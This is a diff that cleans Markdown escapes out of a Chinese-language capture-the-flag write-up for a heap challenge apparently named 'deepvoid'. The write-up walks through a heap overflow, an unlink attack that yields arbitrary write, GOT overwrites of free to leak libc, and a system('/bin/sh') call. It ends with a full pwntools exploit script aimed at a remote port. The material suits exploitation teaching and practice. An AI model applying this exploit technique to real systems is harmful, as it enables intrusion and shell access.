@@ -47,15 +47,15 @@ chunks = 0x6020c0
 
 -   执行 malloc(size)
 
--   返回的指针保存到 chunks\[idx\]
+-   返回的指针保存到 chunks[idx]
 
 ### Modify
 
 -   输入下标 idx
 
--   若 chunks\[idx\] 非空，则执行：
+-   若 chunks[idx] 非空，则执行：
 
-read(0, chunks\[idx\], 0x200);
+read(0, chunks[idx], 0x200);
 
 这里是核心漏洞。read 固定读取 0x200 字节，但 chunk 的申请大小是可控的，所以当申请的 chunk 小于 0x200 时，就会发生堆溢出。
 
@@ -63,9 +63,9 @@ read(0, chunks\[idx\], 0x200);
 
 -   输入下标 idx
 
--   若 chunks\[idx\] 非空，则 free(chunks\[idx\])
+-   若 chunks[idx] 非空，则 free(chunks[idx])
 
--   然后将 chunks\[idx\] = 0
+-   然后将 chunks[idx] = 0
 
 漏洞分析
 --------
@@ -119,7 +119,7 @@ chunk3 = malloc(0x20)
 
 从 chunk0 写入伪造数据，把 chunk1 伪造成可被 unlink 的 chunk：
 
-fake\_chunk = flat(
+fake_chunk = flat(
 
 0,
 
@@ -131,11 +131,11 @@ chunks - 0x10,
 
 )
 
-fake\_chunk = fake\_chunk.ljust(0x80, b"A")
+fake_chunk = fake_chunk.ljust(0x80, b"A")
 
-fake\_chunk += p64(0x80)
+fake_chunk += p64(0x80)
 
-fake\_chunk += p64(0x90)
+fake_chunk += p64(0x90)
 
 关键点：
 
@@ -157,13 +157,13 @@ remove(1)
 
 接着利用 modify(0, ...) 直接改写 chunks 的若干槽位：
 
-layout = b"B" \* 0x18 + flat(
+layout = b"B" * 0x18 + flat(
 
 chunks - 0x18,
 
-elf.got\["free"\],
+elf.got["free"],
 
-elf.got\["puts"\],
+elf.got["puts"],
 
 binsh,
 
@@ -179,11 +179,11 @@ binsh,
 
 这样后续：
 
--   chunks\[1\] -&gt; free@got
+-   chunks[1] -&gt; free@got
 
--   chunks\[2\] -&gt; puts@got
+-   chunks[2] -&gt; puts@got
 
--   chunks\[3\] -&gt; .bss 可写地址，用来存 /bin/sh
+-   chunks[3] -&gt; .bss 可写地址，用来存 /bin/sh
 
 此时 modify(idx, data) 就相当于对任意目标地址写数据。
 
@@ -191,13 +191,13 @@ binsh,
 
 先把 free@got 改成 puts@plt：
 
-modify(1, p64(elf.plt\["puts"\]))
+modify(1, p64(elf.plt["puts"]))
 
 再触发：
 
 remove(2)
 
-因为 remove(2) 本来会调用 free(chunks\[2\])，而现在 free@got 已经被改成了 puts@plt，所以实际执行的是：
+因为 remove(2) 本来会调用 free(chunks[2])，而现在 free@got 已经被改成了 puts@plt，所以实际执行的是：
 
 puts(puts@got)
 
@@ -207,9 +207,9 @@ puts(puts@got)
 
 有了 libc 基址后，把 free@got 改成 system：
 
-modify(1, p64(libc.sym\["system"\]))
+modify(1, p64(libc.sym["system"]))
 
-然后把 /bin/sh 写到 chunks\[3\] 指向的位置：
+然后把 /bin/sh 写到 chunks[3] 指向的位置：
 
 modify(3, b"/bin/sh\\\\x00")
 
@@ -217,7 +217,7 @@ modify(3, b"/bin/sh\\\\x00")
 
 remove(3)
 
-原本是 free(chunks\[3\])，现在会变成：
+原本是 free(chunks[3])，现在会变成：
 
 system("/bin/sh")
 
@@ -236,7 +236,7 @@ EXP
 
 from pathlib import Path
 
-from pwn import \*
+from pwn import *
 
 BIN = "deepvoid"
 
@@ -248,7 +248,7 @@ PORT = 55555
 
 context.binary = elf = ELF(BIN)
 
-context.log\_level = "debug"
+context.log_level = "debug"
 
 libc = ELF(LIBC)
 
@@ -296,7 +296,7 @@ create(io, 2, 0x80)
 
 create(io, 3, 0x20)
 
-fake\_chunk = flat(
+fake_chunk = flat(
 
 0,
 
@@ -308,25 +308,25 @@ chunks - 0x10,
 
 )
 
-fake\_chunk = fake\_chunk.ljust(0x80, b"A")
+fake_chunk = fake_chunk.ljust(0x80, b"A")
 
-fake\_chunk += p64(0x80)
+fake_chunk += p64(0x80)
 
-fake\_chunk += p64(0x90)
+fake_chunk += p64(0x90)
 
-modify(io, 0, fake\_chunk)
+modify(io, 0, fake_chunk)
 
 remove(io, 1)
 
-\# After unlink, chunk 0 overlaps the global chunks array and becomes an arbitrary write primitive.
+# After unlink, chunk 0 overlaps the global chunks array and becomes an arbitrary write primitive.
 
-layout = b"B" \* 0x18 + flat(
+layout = b"B" * 0x18 + flat(
 
 chunks - 0x18,
 
-elf.got\["free"\],
+elf.got["free"],
 
-elf.got\["puts"\],
+elf.got["puts"],
 
 binsh,
 
@@ -344,24 +344,24 @@ modify(io, 0, layout)
 
 modify(io, 3, b"/bin/sh\\x00")
 
-modify(io, 1, p64(elf.plt\["puts"\]))
+modify(io, 1, p64(elf.plt["puts"]))
 
 remove(io, 2)
 
 leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
 
-libc.address = leak - libc.sym\["puts"\]
+libc.address = leak - libc.sym["puts"]
 
 log.success(f"puts leak: {hex(leak)}")
 
 log.success(f"libc base: {hex(libc.address)}")
 
-modify(io, 1, p64(libc.sym\["system"\]))
+modify(io, 1, p64(libc.sym["system"]))
 
 remove(io, 3)
 
 io.interactive()
 
-if \_\_name\_\_ == "\_\_main\_\_":
+if __name__ == "__main__":
 
 main()
